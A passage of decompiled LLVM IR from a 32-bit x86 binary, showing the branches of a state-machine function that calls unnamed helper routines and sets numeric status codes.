  %v0_804d9e5 = load i32, i32* %stack_var_-192, align 4
  %v1_804d9e5 = call i32 @function_8048427(i32 %v0_804d9e5)
  %v1_804d9ed = icmp eq i32 %v1_804d9e5, 0
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  br i1 %v1_804d9ed, label %dec_label_pc_804da11, label %dec_label_pc_804d9f1

dec_label_pc_804d9f1:                             ; preds = %dec_label_pc_804d9c4
  store i8 0, i8* %v4_804d252, align 4
  br label %dec_label_pc_804e255

dec_label_pc_804da11:                             ; preds = %dec_label_pc_804d9c4
  store i8 3, i8* %v4_804d252, align 4
  br label %dec_label_pc_804e255

dec_label_pc_804da31:                             ; preds = %dec_label_pc_804d96e
  store i32 %v1_804d205, i32* %eax.global-to-local, align 4
  %v2_804da4c = load i32, i32* %v1_804d208, align 4
  store i32 %v2_804da4c, i32* %eax.global-to-local, align 4
  %v1_804da4e = add i32 %v2_804da4c, 6
  store i32 %v1_804da4e, i32* @ebx, align 4
  %v1_804da54 = add i32 %v0_804d9bd, 16
  %v2_804da54 = inttoptr i32 %v1_804da54 to i32*
  store i32 0, i32* %v2_804da54, align 4
  %v0_804da56 = load i32, i32* %stack_var_-192, align 4
  %v1_804da56 = inttoptr i32 %v0_804da56 to i32*
  %v2_804da56 = call i32 @function_80504b0(i32* %v1_804da56)
  store i32 %v2_804da56, i32* %eax.global-to-local, align 4
  %v0_804da5e = load i32, i32* @ebx, align 4
  %v7_804da5e = icmp ult i32 %v0_804da5e, %v2_804da56
  %v1_804da60 = icmp eq i1 %v7_804da5e, false
  br i1 %v1_804da60, label %dec_label_pc_804e255, label %dec_label_pc_804da66

dec_label_pc_804da66:                             ; preds = %dec_label_pc_804da31
  store i8 0, i8* %v4_804d252, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804da97 = add i32 %v2_804d1ad, %v2_804d201
  %v4_804da97 = inttoptr i32 %v3_804da97 to i8*
  store i8 1, i8* %v4_804da97, align 1
  br label %dec_label_pc_804e255

dec_label_pc_804daa1:                             ; preds = %dec_label_pc_804d23c
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804dab7 = add i32 %v2_804d3be, %v2_804d201
  %v4_804dab7 = inttoptr i32 %v3_804dab7 to i8*
  %v5_804dab7 = load i8, i8* %v4_804dab7, align 2
  %v6_804dab7 = zext i8 %v5_804dab7 to i32
  store i32 %v6_804dab7, i32* %eax.global-to-local, align 4
  %v1_804dac0 = mul nuw nsw i32 %v6_804dab7, 4
  %v2_804dac0 = add nuw nsw i32 %v1_804dac0, 134598976
  %v3_804dac0 = inttoptr i32 %v2_804dac0 to i32*
  %v4_804dac0 = load i32, i32* %v3_804dac0, align 4
  %v1_804dad2 = and i32 %v4_804dac0, -256
  store i32 %v1_804dad2, i32* %eax.global-to-local, align 4
  %v4_804dad5 = inttoptr i32 %v4_804dac0 to i8*
  store i32 %v4_804dac0, i32* @edi, align 4
  %v3_804dadb = call i32 @_strlen(i8* %v4_804dad5)
  store i32 %v3_804dadb, i32* @esi, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v5_804dafa = load i8, i8* %v4_804dab7, align 2
  %v6_804dafa = zext i8 %v5_804dafa to i32
  store i32 %v6_804dafa, i32* %eax.global-to-local, align 4
  %v1_804db03 = mul nuw nsw i32 %v6_804dafa, 4
  %v2_804db03 = add nuw nsw i32 %v1_804db03, 134598976
  %v3_804db03 = inttoptr i32 %v2_804db03 to i32*
  %v4_804db03 = load i32, i32* %v3_804db03, align 4
  store i32 %v4_804db03, i32* @ebx, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804db20 = inttoptr i32 %v2_804d203 to i32*
  %v4_804db20 = load i32, i32* %v3_804db20, align 4
  store i32 %v4_804db20, i32* %eax.global-to-local, align 4
  %v0_804db23 = load i32, i32* @esp, align 4
  %v1_804db23 = add i32 %v0_804db23, -4
  %v2_804db23 = inttoptr i32 %v1_804db23 to i32*
  store i32 16384, i32* %v2_804db23, align 4
  %v0_804db28 = load i32, i32* @esi, align 4
  %v2_804db28 = add i32 %v0_804db23, -8
  %v3_804db28 = inttoptr i32 %v2_804db28 to i32*
  store i32 %v0_804db28, i32* %v3_804db28, align 4
  %v0_804db29 = load i32, i32* @ebx, align 4
  %v2_804db29 = add i32 %v0_804db23, -12
  %v3_804db29 = inttoptr i32 %v2_804db29 to i32*
  store i32 %v0_804db29, i32* %v3_804db29, align 4
  %v0_804db2a = load i32, i32* %eax.global-to-local, align 4
  %v2_804db2a = add i32 %v0_804db23, -16
  %v3_804db2a = inttoptr i32 %v2_804db2a to i32*
  store i32 %v0_804db2a, i32* %v3_804db2a, align 4
  %v4_804db2b = call i32 @function_8051d08(i32 %v4_804dac0, i32 %v2_804d124, i32 %v6_804d252, i32 ptrtoint (i32* @0 to i32))
  %v0_804db30 = load i32, i32* @esp, align 4
  %v2_804db33 = icmp slt i32 %v4_804db2b, 0
  %v1_804db35 = icmp eq i1 %v2_804db33, false
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  br i1 %v1_804db35, label %dec_label_pc_804db72, label %dec_label_pc_804db37

dec_label_pc_804db37:                             ; preds = %dec_label_pc_804daa1
  store i8 0, i8* %v4_804d252, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804db68 = add i32 %v2_804d1ad, %v2_804d201
  %v4_804db68 = inttoptr i32 %v3_804db68 to i8*
  store i8 1, i8* %v4_804db68, align 1
  br label %dec_label_pc_804e255

dec_label_pc_804db72:                             ; preds = %dec_label_pc_804daa1
  %v4_804db88 = load i32, i32* %v3_804db20, align 4
  store i32 %v4_804db88, i32* %eax.global-to-local, align 4
  %v1_804db8b = add i32 %v0_804db30, 12
  %v2_804db8b = inttoptr i32 %v1_804db8b to i32*
  store i32 16384, i32* %v2_804db8b, align 4
  %v1_804db90 = add i32 %v0_804db30, 8
  %v2_804db90 = inttoptr i32 %v1_804db90 to i32*
  store i32 2, i32* %v2_804db90, align 4
  %v1_804db92 = add i32 %v0_804db30, 4
  %v2_804db92 = inttoptr i32 %v1_804db92 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_805abcd.295 to i32), i32* %v2_804db92, align 4
  %v0_804db97 = load i32, i32* %eax.global-to-local, align 4
  %v3_804db97 = inttoptr i32 %v0_804db30 to i32*
  store i32 %v0_804db97, i32* %v3_804db97, align 4
  %v4_804db98 = call i32 @function_8051d08(i32 %v4_804dac0, i32 %v2_804d124, i32 %v6_804d252, i32 ptrtoint (i32* @0 to i32))
  %v2_804dba0 = icmp slt i32 %v4_804db98, 0
  %v1_804dba2 = icmp eq i1 %v2_804dba0, false
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  br i1 %v1_804dba2, label %dec_label_pc_804dbdf, label %dec_label_pc_804dba4

dec_label_pc_804dba4:                             ; preds = %dec_label_pc_804db72
  store i8 0, i8* %v4_804d252, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804dbd5 = add i32 %v2_804d1ad, %v2_804d201
  %v4_804dbd5 = inttoptr i32 %v3_804dbd5 to i8*
  store i8 1, i8* %v4_804dbd5, align 1
  br label %dec_label_pc_804e255

dec_label_pc_804dbdf:                             ; preds = %dec_label_pc_804db72
  store i8 4, i8* %v4_804d252, align 4
  br label %dec_label_pc_804e255

dec_label_pc_804dbff:                             ; preds = %dec_label_pc_804d23c
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  %v1_804dc17 = add i32 %v2_804d203, 24
  store i32 %v1_804dc17, i32* %eax.global-to-local, align 4
  %v1_804dc1a = inttoptr i32 %v1_804dc17 to i32*
  %v2_804dc1a = load i32, i32* %v1_804dc1a, align 4
  store i32 %v2_804dc1a, i32* @ebx, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804dc32 = inttoptr i32 %v2_804d203 to i32*
  %v4_804dc32 = load i32, i32* %v3_804dc32, align 4
  store i32 %v4_804dc32, i32* %eax.global-to-local, align 4
  %v0_804dc35 = load i32, i32* @esp, align 4
  %v1_804dc38 = add i32 %v0_804dc35, -16
  %v2_804dc38 = inttoptr i32 %v1_804dc38 to i32*
  store i32 ptrtoint (i32* @global_var_805d094 to i32), i32* %v2_804dc38, align 4
  %v1_804dc3d = add i32 %v0_804dc35, -20
  %v2_804dc3d = inttoptr i32 %v1_804dc3d to i32*
  store i32 512, i32* %v2_804dc3d, align 4
  %v0_804dc42 = load i32, i32* @ebx, align 4
  %v2_804dc42 = add i32 %v0_804dc35, -24
  %v3_804dc42 = inttoptr i32 %v2_804dc42 to i32*
  store i32 %v0_804dc42, i32* %v3_804dc42, align 4
  %v1_804dc43 = add i32 %v0_804dc35, -28
  %v2_804dc43 = inttoptr i32 %v1_804dc43 to i32*
  store i32 10000, i32* %v2_804dc43, align 4
  %v0_804dc48 = load i32, i32* %eax.global-to-local, align 4
  %v2_804dc48 = add i32 %v0_804dc35, -32
  %v3_804dc48 = inttoptr i32 %v2_804dc48 to i32*
  store i32 %v0_804dc48, i32* %v3_804dc48, align 4
  %v1_804dc49 = call i32 @function_8048524(i32 %v6_804d252)
  %v0_804dc4e = load i32, i32* @esp, align 4
  %v1_804dc51 = icmp eq i32 %v1_804dc49, 0
  store i32 %v1_804d1f3, i32* @edx, align 4
  store i32 %v2_804d203, i32* %eax.global-to-local, align 4
  br i1 %v1_804dc51, label %dec_label_pc_804dcc2, label %dec_label_pc_804dc55

dec_label_pc_804dc55:                             ; preds = %dec_label_pc_804dbff
  store i32 %v1_804dc17, i32* %eax.global-to-local, align 4
  %v2_804dc70 = load i32, i32* %v1_804dc1a, align 4
  store i32 %v2_804dc70, i32* %eax.global-to-local, align 4
  %v2_804dc75 = add i32 %v0_804dc4e, 16
  %v3_804dc75 = inttoptr i32 %v2_804dc75 to i32*
  store i32 %v2_804dc70, i32* %v3_804dc75, align 4
  %v1_804dc76 = call i32 @function_8048427(i32 %stack_var_-620.238)
  %v1_804dc7e = icmp eq i32 %v1_804dc76, 0
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  br i1 %v1_804dc7e, label %dec_label_pc_804dca2, label %dec_label_pc_804dc82

dec_label_pc_804dc82:                             ; preds = %dec_label_pc_804dc55
  store i8 0, i8* %v4_804d252, align 4
  br label %dec_label_pc_804e255

dec_label_pc_804dca2:                             ; preds = %dec_label_pc_804dc55
  store i8 5, i8* %v4_804d252, align 4
  br label %dec_label_pc_804e255

dec_label_pc_804dcc2:                             ; preds = %dec_label_pc_804dbff
  store i32 %v1_804d205, i32* %eax.global-to-local, align 4
  %v2_804dcdd = load i32, i32* %v1_804d208, align 4
  store i32 %v2_804dcdd, i32* %eax.global-to-local, align 4
  %v1_804dcdf = add i32 %v2_804dcdd, 6
  store i32 %v1_804dcdf, i32* @ebx, align 4
  %v1_804dce5 = add i32 %v0_804dc4e, 16
  %v2_804dce5 = inttoptr i32 %v1_804dce5 to i32*
  store i32 0, i32* %v2_804dce5, align 4
  %v1_804dce7 = inttoptr i32 %stack_var_-620.238 to i32*
  %v2_804dce7 = call i32 @function_80504b0(i32* %v1_804dce7)
  store i32 %v2_804dce7, i32* %eax.global-to-local, align 4
  %v0_804dcef = load i32, i32* @ebx, align 4
  %v7_804dcef = icmp ult i32 %v0_804dcef, %v2_804dce7
  %v1_804dcf1 = icmp eq i1 %v7_804dcef, false
  br i1 %v1_804dcf1, label %dec_label_pc_804e255, label %dec_label_pc_804dcf7

dec_label_pc_804dcf7:                             ; preds = %dec_label_pc_804dcc2
  store i8 0, i8* %v4_804d252, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804dd28 = add i32 %v2_804d1ad, %v2_804d201
  %v4_804dd28 = inttoptr i32 %v3_804dd28 to i8*
  store i8 1, i8* %v4_804dd28, align 1
  br label %dec_label_pc_804e255

dec_label_pc_804dd32:                             ; preds = %dec_label_pc_804d23c
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804dd48 = add i32 %v2_804d384, %v2_804d201
  %v4_804dd48 = inttoptr i32 %v3_804dd48 to i8*
  %v5_804dd48 = load i8, i8* %v4_804dd48, align 1
  %v6_804dd48 = zext i8 %v5_804dd48 to i32
  store i32 %v6_804dd48, i32* %eax.global-to-local, align 4
  %v1_804dd51 = mul nuw nsw i32 %v6_804dd48, 4
  %v2_804dd51 = add nuw nsw i32 %v1_804dd51, 134599040
  %v3_804dd51 = inttoptr i32 %v2_804dd51 to i32*
  %v4_804dd51 = load i32, i32* %v3_804dd51, align 4
  %v1_804dd63 = and i32 %v4_804dd51, -256
  store i32 %v1_804dd63, i32* %eax.global-to-local, align 4
  %v4_804dd66 = inttoptr i32 %v4_804dd51 to i8*
  store i32 %v4_804dd51, i32* @edi, align 4
  %v3_804dd6c = call i32 @_strlen(i8* %v4_804dd66)
  store i32 %v3_804dd6c, i32* @esi, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v5_804dd8b = load i8, i8* %v4_804dd48, align 1
  %v6_804dd8b = zext i8 %v5_804dd8b to i32
  store i32 %v6_804dd8b, i32* %eax.global-to-local, align 4
  %v1_804dd94 = mul nuw nsw i32 %v6_804dd8b, 4
  %v2_804dd94 = add nuw nsw i32 %v1_804dd94, 134599040
  %v3_804dd94 = inttoptr i32 %v2_804dd94 to i32*
  %v4_804dd94 = load i32, i32* %v3_804dd94, align 4
  store i32 %v4_804dd94, i32* @ebx, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804ddb1 = inttoptr i32 %v2_804d203 to i32*
  %v4_804ddb1 = load i32, i32* %v3_804ddb1, align 4
  store i32 %v4_804ddb1, i32* %eax.global-to-local, align 4
  %v0_804ddb4 = load i32, i32* @esp, align 4
  %v1_804ddb4 = add i32 %v0_804ddb4, -4
  %v2_804ddb4 = inttoptr i32 %v1_804ddb4 to i32*
  store i32 16384, i32* %v2_804ddb4, align 4
  %v0_804ddb9 = load i32, i32* @esi, align 4
  %v2_804ddb9 = add i32 %v0_804ddb4, -8
  %v3_804ddb9 = inttoptr i32 %v2_804ddb9 to i32*
  store i32 %v0_804ddb9, i32* %v3_804ddb9, align 4
  %v0_804ddba = load i32, i32* @ebx, align 4
  %v2_804ddba = add i32 %v0_804ddb4, -12
  %v3_804ddba = inttoptr i32 %v2_804ddba to i32*
  store i32 %v0_804ddba, i32* %v3_804ddba, align 4
  %v0_804ddbb = load i32, i32* %eax.global-to-local, align 4
  %v2_804ddbb = add i32 %v0_804ddb4, -16
  %v3_804ddbb = inttoptr i32 %v2_804ddbb to i32*
  store i32 %v0_804ddbb, i32* %v3_804ddbb, align 4
  %v4_804ddbc = call i32 @function_8051d08(i32 %v4_804dd51, i32 %stack_var_-620.238, i32 %v2_804d124, i32 %v6_804d252)
  %v0_804ddc1 = load i32, i32* @esp, align 4
  %v2_804ddc4 = icmp slt i32 %v4_804ddbc, 0
  %v1_804ddc6 = icmp eq i1 %v2_804ddc4, false
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  br i1 %v1_804ddc6, label %dec_label_pc_804de03, label %dec_label_pc_804ddc8

dec_label_pc_804ddc8:                             ; preds = %dec_label_pc_804dd32
  store i8 0, i8* %v4_804d252, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804ddf9 = add i32 %v2_804d1ad, %v2_804d201
  %v4_804ddf9 = inttoptr i32 %v3_804ddf9 to i8*
  store i8 1, i8* %v4_804ddf9, align 1
  br label %dec_label_pc_804e255

dec_label_pc_804de03:                             ; preds = %dec_label_pc_804dd32
  %v4_804de19 = load i32, i32* %v3_804ddb1, align 4
  store i32 %v4_804de19, i32* %eax.global-to-local, align 4
  %v1_804de1c = add i32 %v0_804ddc1, 12
  %v2_804de1c = inttoptr i32 %v1_804de1c to i32*
  store i32 16384, i32* %v2_804de1c, align 4
  %v1_804de21 = add i32 %v0_804ddc1, 8
  %v2_804de21 = inttoptr i32 %v1_804de21 to i32*
  store i32 2, i32* %v2_804de21, align 4
  %v1_804de23 = add i32 %v0_804ddc1, 4
  %v2_804de23 = inttoptr i32 %v1_804de23 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_805abcd.295 to i32), i32* %v2_804de23, align 4
  %v0_804de28 = load i32, i32* %eax.global-to-local, align 4
  %v3_804de28 = inttoptr i32 %v0_804ddc1 to i32*
  store i32 %v0_804de28, i32* %v3_804de28, align 4
  %v4_804de29 = call i32 @function_8051d08(i32 %v4_804dd51, i32 %stack_var_-620.238, i32 %v2_804d124, i32 %v6_804d252)
  %v2_804de31 = icmp slt i32 %v4_804de29, 0
  %v1_804de33 = icmp eq i1 %v2_804de31, false
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  br i1 %v1_804de33, label %dec_label_pc_804de70, label %dec_label_pc_804de35

dec_label_pc_804de35:                             ; preds = %dec_label_pc_804de03
  store i8 0, i8* %v4_804d252, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804de66 = add i32 %v2_804d1ad, %v2_804d201
  %v4_804de66 = inttoptr i32 %v3_804de66 to i8*
  store i8 1, i8* %v4_804de66, align 1
  br label %dec_label_pc_804e255

dec_label_pc_804de70:                             ; preds = %dec_label_pc_804de03
  store i8 6, i8* %v4_804d252, align 4
  br label %dec_label_pc_804e255

dec_label_pc_804de90:                             ; preds = %dec_label_pc_804d23c
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  %v1_804dea8 = add i32 %v2_804d203, 24
  store i32 %v1_804dea8, i32* %eax.global-to-local, align 4
  %v1_804deab = inttoptr i32 %v1_804dea8 to i32*
  %v2_804deab = load i32, i32* %v1_804deab, align 4
  store i32 %v2_804deab, i32* @ebx, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804dec3 = inttoptr i32 %v2_804d203 to i32*
  %v4_804dec3 = load i32, i32* %v3_804dec3, align 4
  store i32 %v4_804dec3, i32* %eax.global-to-local, align 4
  %v0_804dec6 = load i32, i32* @esp, align 4
  %v1_804dec9 = add i32 %v0_804dec6, -16
  %v2_804dec9 = inttoptr i32 %v1_804dec9 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_805d0c0.297 to i32), i32* %v2_804dec9, align 4
  %v1_804dece = add i32 %v0_804dec6, -20
  %v2_804dece = inttoptr i32 %v1_804dece to i32*
  store i32 512, i32* %v2_804dece, align 4
  %v0_804ded3 = load i32, i32* @ebx, align 4
  %v2_804ded3 = add i32 %v0_804dec6, -24
  %v3_804ded3 = inttoptr i32 %v2_804ded3 to i32*
  store i32 %v0_804ded3, i32* %v3_804ded3, align 4
  %v1_804ded4 = add i32 %v0_804dec6, -28
  %v2_804ded4 = inttoptr i32 %v1_804ded4 to i32*
  store i32 10000, i32* %v2_804ded4, align 4
  %v0_804ded9 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ded9 = add i32 %v0_804dec6, -32
  %v3_804ded9 = inttoptr i32 %v2_804ded9 to i32*
  store i32 %v0_804ded9, i32* %v3_804ded9, align 4
  %v1_804deda = call i32 @function_8048524(i32 %v6_804d252)
  store i32 %v1_804deda, i32* %eax.global-to-local, align 4
  %v0_804dedf = load i32, i32* @esp, align 4
  %v1_804dee2 = icmp eq i32 %v1_804deda, 0
  br i1 %v1_804dee2, label %dec_label_pc_804e010, label %dec_label_pc_804deea

dec_label_pc_804deea:                             ; preds = %dec_label_pc_804de90
  store i32 %storemerge39, i32* @ebx, align 4
  %v1_804def0 = add i32 %v0_804dedf, 16
  %v2_804def0 = inttoptr i32 %v1_804def0 to i32*
  store i32 0, i32* %v2_804def0, align 4
  %v1_804def2 = inttoptr i32 %stack_var_-624.237 to i32*
  %v2_804def2 = call i32 @function_80504b0(i32* %v1_804def2)
  store i32 %v2_804def2, i32* @esi, align 4
  %v0_804deff = load i32, i32* @ebx, align 4
  %v2_804df0f = mul i32 %v0_804deff, 28
  %v1_804df13 = add i32 %v2_804df11, %v2_804df0f
  %v2_804df16 = inttoptr i32 %v1_804df13 to i32*
  store i32 %v2_804def2, i32* %v2_804df16, align 4
  store i32 %v1_804d1f3, i32* @edx, align 4
  store i32 %v1_804dea8, i32* %eax.global-to-local, align 4
  %v2_804df33 = load i32, i32* %v1_804deab, align 4
  store i32 %v2_804df33, i32* %eax.global-to-local, align 4
  %v0_804df35 = load i32, i32* @esp, align 4
  %v2_804df38 = add i32 %v0_804df35, -16
  %v3_804df38 = inttoptr i32 %v2_804df38 to i32*
  store i32 %v2_804df33, i32* %v3_804df38, align 4
  %v1_804df39 = call i32 @function_8048427(i32 %stack_var_-624.237)
  %v0_804df3e = load i32, i32* @esp, align 4
  %v1_804df41 = icmp eq i32 %v1_804df39, 0
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  br i1 %v1_804df41, label %dec_label_pc_804df65, label %dec_label_pc_804df45

dec_label_pc_804df45:                             ; preds = %dec_label_pc_804deea
  store i8 0, i8* %v4_804d252, align 4
  br label %dec_label_pc_804e255

dec_label_pc_804df65:                             ; preds = %dec_label_pc_804deea
  %v3_804df7b = add i32 %v2_804d384, %v2_804d201
  %v4_804df7b = inttoptr i32 %v3_804df7b to i8*
  %v5_804df7b = load i8, i8* %v4_804df7b, align 1
  %v6_804df7b = zext i8 %v5_804df7b to i32
  store i32 %v6_804df7b, i32* %eax.global-to-local, align 4
  %v1_804df84 = mul nuw nsw i32 %v6_804df7b, 4
  %v2_804df84 = add nuw nsw i32 %v1_804df84, 134599040
  %v3_804df84 = inttoptr i32 %v2_804df84 to i32*
  %v4_804df84 = load i32, i32* %v3_804df84, align 4
  store i32 %v4_804df84, i32* @ebx, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804dfa1 = add i32 %v2_804d3be, %v2_804d201
  %v4_804dfa1 = inttoptr i32 %v3_804dfa1 to i8*
  %v5_804dfa1 = load i8, i8* %v4_804dfa1, align 2
  %v6_804dfa1 = zext i8 %v5_804dfa1 to i32
  store i32 %v6_804dfa1, i32* %eax.global-to-local, align 4
  %v1_804dfaa = mul nuw nsw i32 %v6_804dfa1, 4
  %v2_804dfaa = add nuw nsw i32 %v1_804dfaa, 134598976
  %v3_804dfaa = inttoptr i32 %v2_804dfaa to i32*
  %v4_804dfaa = load i32, i32* %v3_804dfaa, align 4
  store i32 %v4_804dfaa, i32* @esi, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d203, i32* %eax.global-to-local, align 4
  %v3_804dfcd = inttoptr i32 %v0_804df3e to i32*
  store i32 %v2_804d203, i32* %v3_804dfcd, align 4
  %v0_804dfce = call i32 @function_804857e()
  store i32 %v0_804dfce, i32* %eax.global-to-local, align 4
  %v0_804dfd3 = load i32, i32* @esp, align 4
  %v0_804dfd6 = load i32, i32* @global_var_805d8c0.32, align 64
  store i32 %v0_804dfd6, i32* %edx.global-to-local, align 4
  %v0_804dfdf = load i32, i32* @ebx, align 4
  %v3_804dfdf = inttoptr i32 %v0_804dfd3 to i32*
  store i32 %v0_804dfdf, i32* %v3_804dfdf, align 4
  %v0_804dfe0 = load i32, i32* @esi, align 4
  %v2_804dfe0 = add i32 %v0_804dfd3, -4
  %v3_804dfe0 = inttoptr i32 %v2_804dfe0 to i32*
  store i32 %v0_804dfe0, i32* %v3_804dfe0, align 4
  %v2_804dfe1 = add i32 %v0_804dfd3, -8
  %v3_804dfe1 = inttoptr i32 %v2_804dfe1 to i32*
  store i32 %v0_804dfce, i32* %v3_804dfe1, align 4
  %v1_804dfe2 = add i32 %v0_804dfd3, -12
  %v2_804dfe2 = inttoptr i32 %v1_804dfe2 to i32*
  store i32 ptrtoint (i32* @global_var_805abd0.298 to i32), i32* %v2_804dfe2, align 4
  %v0_804dfe7 = load i32, i32* %edx.global-to-local, align 4
  %v2_804dfe7 = add i32 %v0_804dfd3, -16
  %v3_804dfe7 = inttoptr i32 %v2_804dfe7 to i32*
  store i32 %v0_804dfe7, i32* %v3_804dfe7, align 4
  %v2_804dfe8 = call i32 @function_8048b7f(i32 %stack_var_-624.237, i32 %stack_var_-620.238)
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  store i8 7, i8* %v4_804d252, align 4
  br label %dec_label_pc_804e255

dec_label_pc_804e010:                             ; preds = %dec_label_pc_804de90
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v1_804d205, i32* %eax.global-to-local, align 4
  %v2_804e02b = load i32, i32* %v1_804d208, align 4
  store i32 %v2_804e02b, i32* %eax.global-to-local, align 4
  %v1_804e02d = add i32 %v2_804e02b, 7
  store i32 %v1_804e02d, i32* @ebx, align 4
  %v1_804e033 = add i32 %v0_804dedf, 16
  %v2_804e033 = inttoptr i32 %v1_804e033 to i32*
  store i32 0, i32* %v2_804e033, align 4
  %v1_804e035 = inttoptr i32 %stack_var_-624.237 to i32*
  %v2_804e035 = call i32 @function_80504b0(i32* %v1_804e035)
  store i32 %v2_804e035, i32* %eax.global-to-local, align 4
  %v0_804e03d = load i32, i32* @ebx, align 4
  %v7_804e03d = icmp ult i32 %v0_804e03d, %v2_804e035
  %v1_804e03f = icmp eq i1 %v7_804e03d, false
  br i1 %v1_804e03f, label %dec_label_pc_804e255, label %dec_label_pc_804e045

dec_label_pc_804e045:                             ; preds = %dec_label_pc_804e010
  store i8 0, i8* %v4_804d252, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804e076 = add i32 %v2_804d1ad, %v2_804d201
  %v4_804e076 = inttoptr i32 %v3_804e076 to i8*
  store i8 1, i8* %v4_804e076, align 1
  br label %dec_label_pc_804e255

dec_label_pc_804e080:                             ; preds = %dec_label_pc_804d23c
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804e096 = inttoptr i32 %v2_804d203 to i32*
  %v4_804e096 = load i32, i32* %v3_804e096, align 4
  store i32 %v4_804e096, i32* %eax.global-to-local, align 4
  %v0_804e099 = load i32, i32* @esp, align 4
  %v1_804e099 = add i32 %v0_804e099, -4
  %v2_804e099 = inttoptr i32 %v1_804e099 to i32*
  store i32 16384, i32* %v2_804e099, align 4
  %v1_804e09e = add i32 %v0_804e099, -8
  %v2_804e09e = inttoptr i32 %v1_804e09e to i32*
  store i32 425, i32* %v2_804e09e, align 4
  %v1_804e0a3 = add i32 %v0_804e099, -12
  %v2_804e0a3 = inttoptr i32 %v1_804e0a3 to i32*
  store i32 ptrtoint ([485 x i8]* @global_var_805ac10.299 to i32), i32* %v2_804e0a3, align 4
  %v0_804e0a8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e0a8 = add i32 %v0_804e099, -16
  %v3_804e0a8 = inttoptr i32 %v2_804e0a8 to i32*
  store i32 %v0_804e0a8, i32* %v3_804e0a8, align 4
  %v4_804e0a9 = call i32 @function_8051d08(i32 %v6_804d252, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v2_804e0b1 = icmp slt i32 %v4_804e0a9, 0
  %v1_804e0b3 = icmp eq i1 %v2_804e0b1, false
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  br i1 %v1_804e0b3, label %dec_label_pc_804e0f0, label %dec_label_pc_804e0b5

dec_label_pc_804e0b5:                             ; preds = %dec_label_pc_804e080
  store i8 0, i8* %v4_804d252, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804e0e6 = add i32 %v2_804d1ad, %v2_804d201
  %v4_804e0e6 = inttoptr i32 %v3_804e0e6 to i8*
  store i8 1, i8* %v4_804e0e6, align 1
  br label %dec_label_pc_804e255

dec_label_pc_804e0f0:                             ; preds = %dec_label_pc_804e080
  store i8 8, i8* %v4_804d252, align 4
  br label %dec_label_pc_804e255

dec_label_pc_804e110:                             ; preds = %dec_label_pc_804d23c
  store i32 %storemerge39, i32* @ebx, align 4
  %v0_804e113 = load i32, i32* @esp, align 4
  %v1_804e116 = add i32 %v0_804e113, -16
